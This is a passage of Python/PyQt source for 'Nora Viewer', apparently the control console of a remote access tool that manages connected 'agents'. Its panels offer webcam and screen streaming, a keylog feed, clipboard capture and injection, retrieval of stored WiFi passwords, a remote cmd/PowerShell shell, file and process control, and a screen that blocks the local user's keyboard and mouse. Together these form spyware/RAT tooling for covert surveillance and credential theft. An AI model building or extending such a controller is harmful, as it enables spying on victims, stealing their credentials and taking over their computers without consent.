        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        self._q = QLineEdit(); self._q.setStyleSheet(_INP); self._q.setPlaceholderText("Filter…")
        self._q.textChanged.connect(self._render)
        ref = QPushButton("Refresh"); ref.setStyleSheet(_BTN_S)
        ref.clicked.connect(lambda: relay.emit("get_processes",{"_target":relay._agent}))
        self._n_lbl = QLabel("--"); self._n_lbl.setStyleSheet("color:#71717a;font-size:12px")
        bl.addWidget(self._q); bl.addWidget(ref); bl.addStretch(); bl.addWidget(self._n_lbl)
        lay.addWidget(bar)
        self._tbl = QTableWidget(0,4)
        self._tbl.setHorizontalHeaderLabels(["Name","PID","CPU%","RAM"])
        self._tbl.setStyleSheet(_TABLE); self._tbl.horizontalHeader().setStretchLastSection(True)
        self._tbl.setSelectionBehavior(QAbstractItemView.SelectRows)
        self._tbl.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self._tbl.setContextMenuPolicy(Qt.CustomContextMenu)
        self._tbl.customContextMenuRequested.connect(self._ctx)
        lay.addWidget(self._tbl, 1)

    def load(self, procs):
        self._procs = procs; self._n_lbl.setText(f"{len(procs)} processes"); self._render()

    def _render(self):
        q = self._q.text().lower()
        data = [p for p in self._procs if not q or q in p.get("name","").lower() or q in str(p.get("pid",""))]
        self._tbl.setRowCount(len(data))
        for i, p in enumerate(data):
            self._tbl.setItem(i,0,QTableWidgetItem(p.get("name","")))
            self._tbl.setItem(i,1,QTableWidgetItem(str(p.get("pid",""))))
            self._tbl.setItem(i,2,QTableWidgetItem(f"{p.get('cpu',0):.1f}"))
            mb = p.get("mem",0); ram = f"{mb:.0f} MB" if mb else ""
            self._tbl.setItem(i,3,QTableWidgetItem(ram))
            self._tbl.item(i,1).setData(Qt.UserRole, p.get("pid"))

    def _ctx(self, pos):
        row = self._tbl.rowAt(pos.y())
        if row < 0: return
        pid = self._tbl.item(row,1).data(Qt.UserRole) if self._tbl.item(row,1) else None
        name = self._tbl.item(row,0).text() if self._tbl.item(row,0) else ""
        menu = QMenu(self)
        menu.setStyleSheet("QMenu{background:#111318;color:#f4f4f5;border:1px solid #1e1e26}"
                           "QMenu::item:selected{background:#6366f1}")
        menu.addAction(f"Kill {name}").triggered.connect(
            lambda: self.relay.emit("kill_process",{"pid":pid,"_target":self.relay._agent}))
        menu.exec_(self._tbl.viewport().mapToGlobal(pos))


class ShellPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        self._sel = QComboBox()
        self._sel.addItems(["cmd.exe","powershell.exe"])
        self._sel.setStyleSheet("QComboBox{background:#1a1d27;color:#f4f4f5;border:1px solid #2a2d3a;border-radius:7px;padding:4px 8px;font-size:12px}")
        btn_start = QPushButton("Start"); btn_start.setStyleSheet(_BTN_P)
        btn_stop = QPushButton("Stop"); btn_stop.setStyleSheet(_BTN_D)
        btn_start.clicked.connect(lambda: relay.emit("shell_start",{"shell":self._sel.currentText(),"_target":relay._agent}))
        btn_stop.clicked.connect(lambda: relay.emit("shell_stop",{"_target":relay._agent}))
        bl.addWidget(self._sel); bl.addWidget(btn_start); bl.addWidget(btn_stop); bl.addStretch()
        lay.addWidget(bar)
        self._out = QPlainTextEdit(); self._out.setReadOnly(True)
        self._out.setStyleSheet("QPlainTextEdit{background:#0a0a0a;color:#33ff33;border:none;"
                                "font-family:'Courier New',monospace;font-size:12px;padding:8px}")
        lay.addWidget(self._out, 1)
        inp_bar = QWidget(); inp_bar.setFixedHeight(40)
        inp_bar.setStyleSheet("background:#111318;border-top:1px solid #1e1e26")
        il = QHBoxLayout(inp_bar); il.setContentsMargins(10,4,10,4); il.setSpacing(6)
        self._inp = QLineEdit(); self._inp.setStyleSheet(_INP); self._inp.setPlaceholderText("Type command…")
        self._inp.returnPressed.connect(self._send)
        btn_send = QPushButton("Send"); btn_send.setStyleSheet(_BTN_P); btn_send.clicked.connect(self._send)
        il.addWidget(self._inp); il.addWidget(btn_send)
        lay.addWidget(inp_bar)

    def append(self, text: str):
        self._out.moveCursor(QTextCursor.End)
        self._out.insertPlainText(text)
        self._out.moveCursor(QTextCursor.End)

    def _send(self):
        cmd = self._inp.text(); self._inp.clear()
        if cmd: self.relay.emit("shell_input",{"data":cmd,"_target":self.relay._agent})


class PrivacyPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        lay = QVBoxLayout(self); lay.setContentsMargins(20,16,20,16); lay.setSpacing(14)
        lay.addWidget(_lbl("Privacy Screen", "#f4f4f5", 14, True))
        info = QLabel("Covers all monitors with a full-screen overlay.\n"
                      "Physical keyboard & mouse are blocked; remote control stays active.\n"
                      "Emergency local exit: Ctrl+Alt+Shift+F12")
        info.setStyleSheet("background:#1a1d27;border:1px solid #2a2d3a;border-radius:8px;"
                           "color:#a1a1aa;font-size:12px;padding:10px 14px")
        info.setWordWrap(True); lay.addWidget(info)
        lay.addWidget(_lbl("Lock-screen message", "#a1a1aa"))
        self._msg = QTextEdit()
        self._msg.setPlainText("Remote support session in progress.\nPlease do not touch the computer.")
        self._msg.setStyleSheet(_INP); self._msg.setFixedHeight(80)
        lay.addWidget(self._msg)
        lay.addWidget(_lbl("PIN to unlock (optional)", "#a1a1aa"))
        self._pin = QLineEdit(); self._pin.setStyleSheet(_INP); self._pin.setFixedWidth(200)
        self._pin.setPlaceholderText("Leave blank for no PIN"); lay.addWidget(self._pin)
        btn_row = QHBoxLayout()
        btn_start = QPushButton("🔒 Start Privacy Screen"); btn_start.setStyleSheet(_BTN_P)
        btn_stop = QPushButton("🔓 Stop Privacy Screen"); btn_stop.setStyleSheet(_BTN_D)
        btn_start.clicked.connect(self._start); btn_stop.clicked.connect(self._stop)
        btn_row.addWidget(btn_start); btn_row.addWidget(btn_stop); btn_row.addStretch()
        lay.addLayout(btn_row)
        self._result = QLabel(""); self._result.setStyleSheet("color:#71717a;font-size:12px")
        lay.addWidget(self._result); lay.addStretch()

    def _start(self):
        self.relay.emit("privacy_start",{
            "message": self._msg.toPlainText(),
            "pin": self._pin.text() or None,
            "_target": self.relay._agent,
        })

    def _stop(self):
        self.relay.emit("privacy_stop",{
            "pin": self._pin.text() or None,
            "_target": self.relay._agent,
        })

    def on_result(self, d: dict):
        ok = d.get("ok"); msg = d.get("message","")
        color = "#22c55e" if ok else "#ef4444"
        self._result.setStyleSheet(f"color:{color};font-size:12px")
        status = d.get("status",""); self._result.setText(f"{status}: {msg}")


class SysInfoPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        ref = QPushButton("Refresh"); ref.setStyleSheet(_BTN_P)
        ref.clicked.connect(lambda: relay.emit("get_sysinfo",{"_target":relay._agent}))
        upd = QPushButton("🔄 Check Update"); upd.setStyleSheet(_BTN_S)
        upd.clicked.connect(lambda: relay.emit("force_update",{"_target":relay._agent}))
        bl.addWidget(ref); bl.addWidget(upd); bl.addStretch()
        lay.addWidget(bar)
        self._scroll = QScrollArea(); self._scroll.setWidgetResizable(True)
        self._scroll.setStyleSheet("QScrollArea{background:#09090b;border:none}")
        self._body = QWidget(); self._grid = QGridLayout(self._body)
        self._grid.setAlignment(Qt.AlignTop); self._grid.setSpacing(10)
        self._grid.setContentsMargins(16,16,16,16)
        self._scroll.setWidget(self._body); lay.addWidget(self._scroll, 1)

    def load(self, d: dict):
        while self._grid.count():
            item = self._grid.takeAt(0)
            if item.widget(): item.widget().deleteLater()
        col, row = 0, 0
        def card(label, val, sub=""):
            w = QWidget(); w.setStyleSheet("background:#111318;border:1px solid #1e1e26;border-radius:10px")
            cl = QVBoxLayout(w); cl.setContentsMargins(14,12,14,12); cl.setSpacing(3)
            cl.addWidget(_lbl(label,"#71717a",10)); cl.addWidget(_lbl(str(val),"#f4f4f5",15,True))
            if sub: cl.addWidget(_lbl(sub,"#a1a1aa",11))
            return w
        items = [
            ("Hostname", d.get("hostname","?"), d.get("username","")),
            ("OS", d.get("os","?"), d.get("os_version","")),
            ("CPU", d.get("processor","?"), f"{d.get('cpu_cores_physical','?')} cores · {d.get('cpu_percent',0):.0f}% load"),
            ("RAM", f"{d.get('ram_used_gb',0)} / {d.get('ram_total_gb',0)} GB", f"{d.get('ram_percent',0):.0f}% used"),
            ("Uptime", d.get("uptime","?"), ""),
        ]
        for label, val, sub in items:
            self._grid.addWidget(card(label, val, sub), row, col)
            col += 1
            if col >= 3: col = 0; row += 1


class GenericTablePanel(QWidget):
    def __init__(self, relay, event, fetch_label, cols, col_keys):
        super().__init__(); self.relay = relay; self.event = event
        self.col_keys = col_keys
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        self._q = QLineEdit(); self._q.setStyleSheet(_INP); self._q.setPlaceholderText("Filter…")
        self._q.textChanged.connect(self._render)
        fetch = QPushButton(fetch_label); fetch.setStyleSheet(_BTN_P)
        fetch.clicked.connect(self._fetch)
        self._n_lbl = QLabel("--"); self._n_lbl.setStyleSheet("color:#71717a;font-size:12px")
        bl.addWidget(self._q); bl.addWidget(fetch); bl.addStretch(); bl.addWidget(self._n_lbl)
        lay.addWidget(bar)
        self._tbl = QTableWidget(0, len(cols))
        self._tbl.setHorizontalHeaderLabels(cols)
        self._tbl.setStyleSheet(_TABLE); self._tbl.horizontalHeader().setStretchLastSection(True)
        self._tbl.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self._tbl.setSelectionBehavior(QAbstractItemView.SelectRows)
        lay.addWidget(self._tbl, 1)
        self._data = []

    def _fetch(self):
        self.relay.emit(self.event, {"_target": self.relay._agent})

    def load(self, rows, count_key=None):
        self._data = rows; self._n_lbl.setText(f"{len(rows)} items"); self._render()

    def _render(self):
        q = self._q.text().lower()
        rows = [r for r in self._data if not q or
                any(q in str(r.get(k,"")).lower() for k in self.col_keys)]
        self._tbl.setRowCount(len(rows))
        for i, r in enumerate(rows):
            for j, k in enumerate(self.col_keys):
                self._tbl.setItem(i, j, QTableWidgetItem(str(r.get(k,""))))


class CameraPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay; self._on = False
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        bl.addWidget(_lbl("Camera","#f4f4f5",13,True))
        self._btn = QPushButton("Start"); self._btn.setStyleSheet(_BTN_P)
        self._btn.clicked.connect(self._toggle)
        bl.addStretch(); bl.addWidget(self._btn)
        lay.addWidget(bar)
        self._img = QLabel(); self._img.setAlignment(Qt.AlignCenter)
        self._img.setStyleSheet("background:#000"); lay.addWidget(self._img, 1)

    def set_frame(self, b64: str):
        raw = base64.b64decode(b64); img = QImage(); img.loadFromData(raw)
        if not img.isNull():
            pm = QPixmap.fromImage(img).scaled(self._img.width(), self._img.height(),
                Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self._img.setPixmap(pm)

    def _toggle(self):
        self._on = not self._on
        self.relay.emit("camera_on" if self._on else "camera_off", {"_target":self.relay._agent})
        self._btn.setText("Stop" if self._on else "Start")


class ScreenshotPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay; self._data = None
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        bl.addWidget(_lbl("Screenshot","#f4f4f5",13,True)); bl.addStretch()
        take = QPushButton("📸 Capture"); take.setStyleSheet(_BTN_P)
        take.clicked.connect(lambda: relay.emit("take_screenshot",{"_target":relay._agent}))
        save = QPushButton("⬇ Save"); save.setStyleSheet(_BTN_S); save.clicked.connect(self._save)
        bl.addWidget(take); bl.addWidget(save)
        lay.addWidget(bar)
        self._img = QLabel("Click Capture to take a screenshot")
        self._img.setAlignment(Qt.AlignCenter)
        self._img.setStyleSheet("background:#000;color:#71717a;font-size:13px")
        lay.addWidget(self._img, 1)

    def show_screenshot(self, b64: str):
        self._data = base64.b64decode(b64); img = QImage(); img.loadFromData(self._data)
        if not img.isNull():
            pm = QPixmap.fromImage(img).scaled(self._img.width(), self._img.height(),
                Qt.KeepAspectRatio, Qt.SmoothTransformation)
            self._img.setPixmap(pm)

    def _save(self):
        if not self._data: return
        p, _ = QFileDialog.getSaveFileName(self,"Save Screenshot","screenshot.png","PNG (*.png)")
        if p:
            with open(p,"wb") as f: f.write(self._data)


class PowerPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        lay = QVBoxLayout(self); lay.setContentsMargins(30,30,30,30); lay.setSpacing(16)
        lay.addWidget(_lbl("⚡ Power Controls","#f4f4f5",14,True))
        grid = QGridLayout(); grid.setSpacing(10)
        actions = [("🔴 Shutdown","shutdown"),("🔁 Restart","restart"),
                   ("💤 Sleep","sleep"),("🔒 Lock","lock"),
                   ("🚪 Log Off","logoff"),("📺 Monitor Off","monitor_off")]
        for idx, (label, action) in enumerate(actions):
            b = QPushButton(label)
            b.setStyleSheet(_BTN_D if action in ("shutdown","restart") else _BTN_S)
            b.setMinimumHeight(50); b.clicked.connect(
                lambda _,a=action: relay.emit("power_action",{"action":a,"_target":relay._agent}))
            grid.addWidget(b, idx//2, idx%2)
        lay.addLayout(grid)
        self._status = QLabel(""); self._status.setStyleSheet("color:#71717a;font-size:12px")
        lay.addWidget(self._status); lay.addStretch()


class WiFiPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4)
        bl.addWidget(_lbl("📶 WiFi Passwords","#f4f4f5",13,True)); bl.addStretch()
        fetch = QPushButton("Fetch"); fetch.setStyleSheet(_BTN_P)
        fetch.clicked.connect(lambda: relay.emit("get_wifi_passwords",{"_target":relay._agent}))
        bl.addWidget(fetch); lay.addWidget(bar)
        self._tbl = QTableWidget(0,3)
        self._tbl.setHorizontalHeaderLabels(["SSID","Password","Auth"])
        self._tbl.setStyleSheet(_TABLE); self._tbl.horizontalHeader().setStretchLastSection(True)
        self._tbl.setEditTriggers(QAbstractItemView.NoEditTriggers)
        lay.addWidget(self._tbl, 1)

    def load(self, rows):
        self._tbl.setRowCount(len(rows))
        for i, r in enumerate(rows):
            self._tbl.setItem(i,0,QTableWidgetItem(r.get("ssid","")))
            self._tbl.setItem(i,1,QTableWidgetItem(r.get("password","")))
            self._tbl.setItem(i,2,QTableWidgetItem(r.get("auth","")))


class ClipboardPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay; self._n = 0
        lay = QVBoxLayout(self); lay.setContentsMargins(0,0,0,0); lay.setSpacing(0)
        bar = QWidget(); bar.setFixedHeight(40)
        bar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        bl = QHBoxLayout(bar); bl.setContentsMargins(12,4,12,4); bl.setSpacing(6)
        bl.addWidget(_lbl("Clipboard","#f4f4f5",13,True)); bl.addStretch()
        self._n_lbl = QLabel("0 entries"); self._n_lbl.setStyleSheet("color:#71717a;font-size:12px")
        bl.addWidget(self._n_lbl); lay.addWidget(bar)
        inj = QWidget(); inj.setFixedHeight(40)
        inj.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        il = QHBoxLayout(inj); il.setContentsMargins(12,4,12,4); il.setSpacing(6)
        self._inp = QLineEdit(); self._inp.setStyleSheet(_INP); self._inp.setPlaceholderText("Inject text into remote clipboard…")
        btn = QPushButton("Inject"); btn.setStyleSheet(_BTN_P); btn.clicked.connect(self._inject)
        il.addWidget(self._inp); il.addWidget(btn); lay.addWidget(inj)
        self._feed = QListWidget(); self._feed.setStyleSheet(_LIST); lay.addWidget(self._feed, 1)

    def add(self, text: str):
        self._n += 1; self._n_lbl.setText(f"{self._n} entries")
        self._feed.insertItem(0, text)

    def _inject(self):
        t = self._inp.text().strip()
        if not t: return
        self.relay.emit("clipboard_set",{"text":t,"_target":self.relay._agent})
        self._inp.clear()


class NotifPanel(QWidget):
    def __init__(self, relay):
        super().__init__(); self.relay = relay
        lay = QVBoxLayout(self); lay.setContentsMargins(20,20,20,20); lay.setSpacing(10)
        lay.addWidget(_lbl("Send Notification","#f4f4f5",14,True))
        lay.addWidget(_lbl("Title","#a1a1aa"))
        self._title = QLineEdit("Nora"); self._title.setStyleSheet(_INP); lay.addWidget(self._title)
        lay.addWidget(_lbl("Message","#a1a1aa"))
        self._msg = QTextEdit(); self._msg.setStyleSheet(_INP); self._msg.setFixedHeight(80)
        lay.addWidget(self._msg)
        send = QPushButton("Send Notification"); send.setStyleSheet(_BTN_P)
        send.clicked.connect(self._send); lay.addWidget(send); lay.addStretch()

    def _send(self):
        self.relay.emit("send_notification",{
            "title":self._title.text(),"message":self._msg.toPlainText(),"_target":self.relay._agent})


# ── Main Window ───────────────────────────────────────────────────────────────
PANELS = [
    # (id, icon, label, group)
    ("screen",   "🖥",  "Screen",        "Monitor"),
    ("cam",      "📷",  "Camera",        "Monitor"),
    ("clip",     "📋",  "Clipboard",     "Monitor"),
    ("kl",       "⌨",   "Keylogs",       "Data"),
    ("files",    "📁",  "Files",         "Data"),
    ("wifi",     "📶",  "WiFi Pwds",     "Data"),
    ("si",       "💻",  "System Info",   "System"),
    ("proc",     "⚙",   "Processes",     "System"),
    ("ss",       "📸",  "Screenshot",    "System"),
    ("shell",    "🖥",  "Shell",         "Control"),
    ("power",    "⚡",  "Power",         "Control"),
    ("privacy",  "🔒",  "Privacy Screen","Control"),
    ("notif",    "🔔",  "Notification",  "Tools"),
]

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Nora Viewer")
        self.resize(1280, 800)

        self._agent = ""
        self._fv_info = None
        self._sig = RelaySignals()
        self._relay = RelayClient(self._sig)
        self._fv_win = FastViewWidget(self._relay)

        self._build_ui()
        self._connect_signals()
        self._apply_palette()

    def _apply_palette(self):
        QApplication.setPalette(_dark_palette())
        self.setStyleSheet("QMainWindow,QWidget{background:#09090b;color:#f4f4f5}"
                           "QScrollBar:vertical{background:#09090b;width:6px;border:none}"
                           "QScrollBar::handle:vertical{background:#2a2d3a;border-radius:3px}"
                           "QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{height:0}"
                           "QComboBox{background:#1a1d27;color:#f4f4f5;border:1px solid #2a2d3a;"
                           "border-radius:7px;padding:5px 10px;font-size:12px}"
                           "QSplitter::handle{background:#1e1e26;width:1px}")

    def _build_ui(self):
        central = QWidget(); self.setCentralWidget(central)
        root = QVBoxLayout(central); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        # Top bar
        topbar = QWidget(); topbar.setFixedHeight(52)
        topbar.setStyleSheet("background:#111318;border-bottom:1px solid #1e1e26")
        tl = QHBoxLayout(topbar); tl.setContentsMargins(14,0,14,0); tl.setSpacing(12)
        logo = QLabel("Nora<sub>VIEWER</sub>")
        logo.setStyleSheet("font-weight:800;font-size:16px;color:#818cf8")
        logo.setTextFormat(Qt.RichText)
        self._conn_dot = QLabel("●"); self._conn_dot.setStyleSheet("color:#71717a;font-size:10px")
        self._conn_txt = QLabel("Connecting")
        self._conn_txt.setStyleSheet("color:#71717a;font-size:12px")
        self._agent_sel = QComboBox(); self._agent_sel.setMinimumWidth(200)
        self._agent_sel.addItem("Select agent")
        self._agent_sel.currentTextChanged.connect(self._on_agent_change)
        self._fps_lbl = QLabel("-- fps"); self._fps_lbl.setStyleSheet("color:#71717a;font-size:11px;background:#1a1d27;border:1px solid #2a2d3a;border-radius:6px;padding:2px 8px")
        for w in (logo, self._conn_dot, self._conn_txt): tl.addWidget(w)
        tl.addStretch(); tl.addWidget(self._agent_sel); tl.addWidget(self._fps_lbl)
        root.addWidget(topbar)

        # Shell: sidebar + stack
        shell = QWidget(); sl = QHBoxLayout(shell); sl.setContentsMargins(0,0,0,0); sl.setSpacing(0)

        # Sidebar
        self._sidebar = QWidget(); self._sidebar.setFixedWidth(210)
        self._sidebar.setStyleSheet("background:#111318;border-right:1px solid #1e1e26")
        sb_lay = QVBoxLayout(self._sidebar); sb_lay.setContentsMargins(6,6,6,6); sb_lay.setSpacing(2)
        sb_scroll = QScrollArea(); sb_scroll.setWidgetResizable(True)
        sb_scroll.setWidget(self._sidebar); sb_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        sb_scroll.setStyleSheet("QScrollArea{background:#111318;border:none}")
        sb_scroll.setFixedWidth(210)
        sl.addWidget(sb_scroll)

        self._stack = QStackedWidget()
        self._stack.setStyleSheet("background:#09090b")
        sl.addWidget(self._stack, 1)
        root.addWidget(shell, 1)

        # Build panels
        self._panels = {}
        self._nav_btns = {}
        self._build_panels(sb_lay)

    def _build_panels(self, sb_lay: QVBoxLayout):
        self._scr = ScreenPanel(self._relay, self._fv_win)
        self._kl  = KeylogPanel(self._relay)
        self._files = FilesPanel(self._relay)
        self._proc = ProcessPanel(self._relay)
        self._shell = ShellPanel(self._relay)
        self._si   = SysInfoPanel(self._relay)
        self._priv = PrivacyPanel(self._relay)
        self._ss   = ScreenshotPanel(self._relay)
        self._cam  = CameraPanel(self._relay)
        self._clip = ClipboardPanel(self._relay)
        self._wifi = WiFiPanel(self._relay)
        self._power= PowerPanel(self._relay)
        self._notif= NotifPanel(self._relay)

        panel_map = {
            "screen":self._scr, "kl":self._kl, "files":self._files,
            "proc":self._proc, "shell":self._shell, "si":self._si,
            "privacy":self._priv, "ss":self._ss, "cam":self._cam,
            "clip":self._clip, "wifi":self._wifi, "power":self._power,
            "notif":self._notif,
        }

        cur_group = None
        for pid, ico, label, group in PANELS:
            if group != cur_group:
                cur_group = group
                glbl = QLabel(group.upper())
                glbl.setStyleSheet("color:#52525b;font-size:9px;letter-spacing:2px;padding:8px 10px 3px")
                sb_lay.addWidget(glbl)
            btn = QPushButton(f"  {ico}  {label}")
            btn.setCheckable(True); btn.setStyleSheet(
                "QPushButton{text-align:left;background:none;border:none;border-radius:8px;"
                "color:#a1a1aa;font-size:12px;padding:8px 10px}"
                "QPushButton:hover{background:#1a1d27;color:#f4f4f5}"
                "QPushButton:checked{background:rgba(99,102,241,.12);color:#818cf8;font-weight:600}")
            w = panel_map.get(pid, QWidget())
            idx = self._stack.addWidget(w)
            btn.clicked.connect(lambda _, i=idx, b=btn: self._nav(i, b))
            sb_lay.addWidget(btn)
            self._panels[pid] = (idx, w); self._nav_btns[pid] = btn

        sb_lay.addStretch()
        # Auto-select first
        first_btn = list(self._nav_btns.values())[0]
        first_btn.setChecked(True); self._stack.setCurrentIndex(0)

    def _nav(self, idx: int, btn: QPushButton):
        for b in self._nav_btns.values(): b.setChecked(False)
        btn.setChecked(True); self._stack.setCurrentIndex(idx)

    def _connect_signals(self):
        sig = self._sig
        sig.connected.connect(self._on_connected)
        sig.disconnected.connect(self._on_disconnected)
        sig.agent_list.connect(self._on_agent_list)
        sig.frame.connect(lambda ag, b64: self._scr.set_frame(b64) if ag==self._agent else None)
        sig.camera_frame.connect(lambda ag, b64: self._cam.set_frame(b64))
        sig.key_event.connect(self._kl.add_key)
        sig.clipboard.connect(lambda ag, t: self._clip.add(t))
        sig.fastcap_info.connect(self._on_fv_info)
        sig.fastcap_video.connect(self._fv_win.on_frame)
        sig.fastcap_ready.connect(self._fv_win.on_ready)
        sig.generic.connect(self._on_generic)

        # FPS from screen
        self._fps_count = 0; self._fps_t = time.monotonic()
        sig.frame.connect(self._tick_fps)

    def _tick_fps(self, *_):
        self._fps_count += 1
        now = time.monotonic()
        if now - self._fps_t >= 1.0:
            self._fps_lbl.setText(f"{self._fps_count} fps")
            self._fps_count = 0; self._fps_t = now

    def _on_connected(self):
        self._conn_dot.setStyleSheet("color:#22c55e;font-size:10px")
        self._conn_txt.setStyleSheet("color:#22c55e;font-size:12px")
        self._conn_txt.setText("Connected")

    def _on_disconnected(self):
        self._conn_dot.setStyleSheet("color:#71717a;font-size:10px")
        self._conn_txt.setStyleSheet("color:#71717a;font-size:12px")
        self._conn_txt.setText("Disconnected")

    def _on_agent_list(self, agents: list):
        prev = self._agent_sel.currentText()
        self._agent_sel.blockSignals(True)
        self._agent_sel.clear(); self._agent_sel.addItem("Select agent")
        for a in agents: self._agent_sel.addItem(a.get("name",""))
        if prev and self._agent_sel.findText(prev) >= 0:
            self._agent_sel.setCurrentText(prev)
        elif agents:
            self._agent_sel.setCurrentIndex(1)
        self._agent_sel.blockSignals(False)
        self._on_agent_change(self._agent_sel.currentText())

    def _on_agent_change(self, name: str):
        if name == "Select agent": name = ""
        self._agent = name; self._relay.set_agent(name)

    def _on_fv_info(self, info: dict):
        self._fv_info = info
        self._scr.set_fv_info(info)

    def _on_generic(self, event: str, data):
        if not isinstance(data, dict): return
        if event == "processes_result":
            self._proc.load(data.get("processes",[]))
        elif event == "dir_result":
            self._files.on_dir(data)
        elif event in ("file_data","write_result","delete_result","rename_result",
                       "copy_result","move_result","upload_result"):
            self._files.on_file(data) if event == "file_data" else None
            if event in ("delete_result","rename_result","copy_result","move_result"):
                ok = data.get("ok"); msg = "Done" if ok else data.get("error","?")
                self._toast(msg, ok)
        elif event == "sysinfo_result":
            self._si.load(data)
        elif event == "screenshot_result":
            if not data.get("error"): self._ss.show_screenshot(data.get("data",""))
        elif event == "shell_started":
            self._shell.append("Shell started\n" if data.get("ok") else f"Failed: {data.get('error','?')}\n")
        elif event == "shell_output":
            t = data.get("data","")
            if t: self._shell.append(t)
        elif event == "wifi_passwords_result":
            self._wifi.load(data.get("passwords",[]))
        elif event == "privacy_result":
            self._priv.on_result(data)
        elif event in ("clipboard_set_result","notification_result","volume_result",
                       "set_wallpaper_result","force_update_result"):
            ok = data.get("ok",True)
            msg = data.get("message") or data.get("error","") or ("OK" if ok else "Error")
            self._toast(str(msg), ok)

    def _toast(self, msg: str, ok: bool = True):
        QMessageBox.information(self, "Nora", msg) if not ok else None
        # For successes just silently pass (avoid dialog spam)

    def closeEvent(self, e):
        self._fv_win.close(); super().closeEvent(e)


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())
